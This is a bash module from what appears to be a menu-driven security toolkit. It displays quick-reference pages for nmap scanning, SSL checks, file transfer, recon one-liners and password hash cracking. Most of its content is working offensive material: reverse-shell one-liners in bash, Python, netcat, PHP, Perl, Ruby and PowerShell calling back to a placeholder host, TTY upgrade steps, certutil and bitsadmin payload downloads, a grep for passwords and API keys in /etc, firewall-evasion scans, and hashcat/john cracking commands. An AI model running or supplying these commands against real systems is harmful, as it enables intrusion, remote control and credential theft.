#!/usr/bin/env bash
# modules/blue/quick_ref.sh

quick_ref_menu() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  📋 Quick Reference Cheatsheet  " \
            --menu "\n  Fast access to essential commands:\n" 20 65 7 \
            "1" "  🗺️   NMAP — Top scan commands" \
            "2" "  🌀  Reverse Shells — All platforms" \
            "3" "  🔒  SSL / Certs — Quick checks" \
            "4" "  📦  File Transfer — Methods" \
            "5" "  🎯  One-Liners — Recon" \
            "6" "  🌐  Ports — Top 50 quick view" \
            "7" "  🔑  Passwords — Hash types" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _qr_nmap ;;
            2) _qr_revshells ;;
            3) _qr_ssl ;;
            4) _qr_filetransfer ;;
            5) _qr_oneliners ;;
            6) source "$MOD_DIR/red/ports.sh"; ports_menu ;;
            7) _qr_hashes ;;
        esac
    done
}

_qr_nmap() { show_page "NMAP — Top Scan Commands" \
"  # Ping sweep
  nmap -sn -PE <RANGE>

  # Open ports
  nmap --open <RANGE>

  # Service + OS detection
  nmap -sV -O -T4 <IP>

  # All ports + scripts
  nmap -p- -sC -sV <IP>

  # UDP scan (top 1000)
  nmap -sU <IP>

  # Aggressive (all-in-one)
  nmap -A -T4 <IP>

  # Vuln scripts
  nmap --script=vuln <IP>

  # Firewall evasion
  nmap -f -D RND:5 <IP>

  # Save all formats
  nmap -oA results <IP>

  # From file
  nmap -iL targets.txt"; }

_qr_revshells() { show_page "Reverse Shells — All Platforms" \
"  # LISTENER (always run first)
  nc -lvnp 4444

  # BASH
  bash -i >& /dev/tcp/<IP>/4444 0>&1
  bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'

  # PYTHON3
  python3 -c 'import socket,subprocess,os; \\
    s=socket.socket(); s.connect((\"<IP>\",4444)); \\
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \\
    os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'

  # NETCAT (with -e)
  nc -e /bin/bash <IP> 4444

  # NETCAT (without -e)
  rm /tmp/f; mkfifo /tmp/f; \\
    cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f

  # PHP
  php -r '\$sock=fsockopen(\"<IP>\",4444); \\
    exec(\"/bin/sh -i <&3 >&3 2>&3\");'

  # PERL
  perl -e 'use Socket; \$i=\"<IP>\"; \$p=4444; \\
    socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); \\
    connect(S,sockaddr_in(\$p,inet_aton(\$i))); \\
    open(STDIN,\">&S\"); open(STDOUT,\">&S\"); \\
    open(STDERR,\">&S\"); exec(\"/bin/sh -i\");'

  # RUBY
  ruby -rsocket -e 'exit if fork; \\
    c=TCPSocket.new(\"<IP>\",\"4444\"); \\
    while(cmd=c.gets); IO.popen(cmd,\"r\"){|io|c.print io.read} end'

  # POWERSHELL
  powershell -c \"\$c=New-Object Net.Sockets.TCPClient('<IP>',4444); \\
    \$s=\$c.GetStream(); [byte[]]\$b=0..65535|%{0}; \\
    while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){ \\
    \$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i); \\
    \$r=(iex \$d 2>&1|Out-String); \\
    \$x=\$r+\\\"PS \\\"+(\$pwd)+'> '; \\
    \$n=\$x.Length; \$s.Write(\$b,0,\$n)}\"

  # UPGRADE TO FULL TTY
  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
  Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm"; }

_qr_ssl() { show_page "SSL / Certs — Quick Checks" \
"  # Get server cert
  openssl s_client -connect <HOST>:443 </dev/null \\
    2>/dev/null | openssl x509 -noout -text

  # Check expiry
  echo | openssl s_client -connect <HOST>:443 \\
    2>/dev/null | openssl x509 -noout -dates

  # Check cipher support (nmap)
  nmap --script ssl-enum-ciphers -p 443 <HOST>

  # Check for vulns
  nmap --script ssl-dh-params,ssl-heartbleed \\
    -p 443 <HOST>

  # TestSSL (comprehensive)
  testssl.sh <HOST>:443

  # SSLScan
  sslscan <HOST>:443

  # Verify cert chain
  openssl verify -CAfile ca-bundle.crt cert.pem

  # Generate self-signed cert
  openssl req -x509 -newkey rsa:4096 \\
    -keyout key.pem -out cert.pem \\
    -days 365 -nodes

  # Decode PEM to text
  openssl x509 -in cert.pem -text -noout"; }

_qr_filetransfer() { show_page "File Transfer — Methods" \
"  # PYTHON HTTP Server (serve files)
  python3 -m http.server 8080

  # WGET download
  wget http://<IP>:8080/<FILE>

  # CURL download
  curl http://<IP>:8080/<FILE> -o <FILE>

  # SCP upload
  scp <FILE> <USER>@<IP>:/tmp/

  # SCP download
  scp <USER>@<IP>:/tmp/<FILE> ./

  # NETCAT send
  nc -w 3 <IP> 9999 < <FILE>
  nc -lvnp 9999 > <FILE>

  # BASE64 transfer (in-band)
  base64 -w0 <FILE>     # encode → copy string
  echo '<B64>' | base64 -d > <FILE>

  # SMB share (Impacket)
  python3 smbserver.py share /path/to/serve
  # On target: copy \\<IP>\\share\\<FILE> C:\\

  # PowerShell download
  Invoke-WebRequest -Uri http://<IP>/<FILE> -OutFile <FILE>
  (New-Object Net.WebClient).DownloadFile('http://<IP>/<FILE>','<FILE>')

  # PowerShell upload
  Invoke-RestMethod -Uri http://<IP>/upload \\
    -Method POST -InFile <FILE>

  # Certutil (Windows)
  certutil -urlcache -split -f http://<IP>/<FILE> <FILE>

  # Bitsadmin (Windows)
  bitsadmin /transfer job http://<IP>/<FILE> C:\\<FILE>"; }

_qr_oneliners() { show_page "One-Liners — Recon & Enumeration" \
"  # Ping sweep (bash)
  for i in {1..254}; do ping -c1 -W1 192.168.1.\$i &>/dev/null && echo \"UP: 192.168.1.\$i\"; done

  # Port scan (bash)
  for p in 21 22 23 25 80 443 3306 3389 8080 8443; do
    (echo >/dev/tcp/192.168.1.1/\$p) 2>/dev/null && echo \"OPEN: \$p\"
  done

  # All listening ports + processes
  ss -tlnp

  # Who has a shell?
  ps auxf | grep 'sh\|bash\|zsh\|dash' | grep -v grep

  # Find world-writable directories
  find / -type d -perm -0002 2>/dev/null | grep -v proc

  # Find recently modified files
  find /etc /bin /sbin -mtime -7 -type f

  # Detect backdoored SUID files
  find / -perm -4000 -type f 2>/dev/null | \\
    xargs ls -la | awk '{print \$1,\$3,\$9}'

  # Dump environment variables
  env | sort

  # Extract IPs from file
  grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' <FILE>

  # Find credentials in configs
  grep -ri 'password\\|passwd\\|secret\\|api_key' /etc/ 2>/dev/null

  # Check sudo without password
  sudo -l 2>/dev/null | grep NOPASSWD

  # List all cron jobs
  for u in \$(cut -f1 -d: /etc/passwd); do
    crontab -u \$u -l 2>/dev/null | grep -v '^#'
  done"; }

_qr_hashes() { show_page "Password Hash Types Reference" \
"  HASH IDENTIFICATION
  ────────────────────
  \$1\$...        MD5 crypt (Linux)
  \$2a\$/\$2y\$...  bcrypt
  \$5\$...        SHA-256 crypt (Linux)
  \$6\$...        SHA-512 crypt (Linux)
  32 hex chars   MD5
  40 hex chars   SHA1
  64 hex chars   SHA256
  128 hex chars  SHA512
  LM:NTLM        Windows SAM hash

  CRACKING WITH JOHN
  ──────────────────
  # Crack with wordlist
  john --wordlist=rockyou.txt hashes.txt

  # Specify format
  john --format=NT hashes.txt
  john --format=md5crypt hashes.txt
  john --format=bcrypt hashes.txt

  # Show cracked
  john --show hashes.txt

  # Rules-based attack
  john --wordlist=rockyou.txt --rules hashes.txt

  CRACKING WITH HASHCAT
  ─────────────────────
  # MD5 (-m 0) dictionary
  hashcat -m 0 hashes.txt rockyou.txt

  # NTLM (-m 1000) dictionary
  hashcat -m 1000 hashes.txt rockyou.txt

  # SHA1 (-m 100)
  hashcat -m 100 hashes.txt rockyou.txt

  # Kerberoast (-m 13100)
  hashcat -m 13100 hashes.txt rockyou.txt

  # WPA2 (-m 2500)
  hashcat -m 2500 capture.hccapx rockyou.txt

  # Bruteforce mask (8 chars)
  hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a?a?a

  HASHCAT MODES REFERENCE
  ────────────────────────
  0     MD5
  100   SHA1
  1000  NTLM
  1800  SHA-512 crypt (\$6\$)
  2100  DCC2 / MS-Cache2
  5600  NetNTLMv2
  13100 Kerberos TGS (\$krb5tgs\$)"
}
